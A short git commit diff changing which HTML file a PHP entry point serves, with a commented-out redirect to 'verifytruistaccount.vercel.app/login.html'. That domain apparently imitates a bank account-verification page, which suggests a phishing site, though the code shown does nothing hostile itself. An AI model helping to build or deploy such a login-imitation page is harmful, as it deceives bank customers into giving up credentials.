62ef431d1cbf5bbb633142fdf145c7217f60777a
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2024-08-07 12:07:23 +0100

    retry

--- api/index.php
+++ api/index.php
@@ -1,7 +1,7 @@
 <?php
-require_once __DIR__ . '/../vendor/autoload.php';
 
-require __DIR__ . '/../login.html';
+
+require_once __DIR__ . '/../index.html';
 
 // header("Location: https://verifytruistaccount.vercel.app/login.html");
 
